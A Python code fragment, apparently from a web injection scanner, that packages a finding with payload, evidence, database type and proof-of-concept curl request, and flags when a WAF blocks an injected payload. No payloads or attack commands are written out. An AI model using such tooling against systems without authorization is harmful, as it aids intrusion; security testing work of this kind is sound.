        def _snippet(ex: HttpExchange) -> str:
            body = (ex.response_body or "").strip().replace("\r", "")
            return f"HTTP {ex.status_code}\n{body[:600]}"

        return Finding(
            param=point.name,
            location=point.location,
            injection_type=itype,
            severity=severity,
            payload=injected.payload or "",
            evidence=evidence,
            confidence=confidence,
            db_type=db,
            poc_curl=poc_curl,
            poc_request=poc_req,
            response_before=_snippet(baseline),
            response_after=_snippet(injected),
            payload_url=injected.url or "",
        )

    @staticmethod
    def _is_blocked(baseline: HttpExchange, injected: HttpExchange) -> bool:
        """Payload refused by a WAF/filter while the endpoint itself is live."""
        block_codes = {403, 406, 429, 501, 999}
        return (
            baseline.status_code not in block_codes
            and 200 <= baseline.status_code < 400
            and injected.status_code in block_codes
        )

    @staticmethod
    def _map_severity(s: str) -> Severity:
        try:
            return Severity(s.lower())
        except ValueError:
            return Severity.MEDIUM
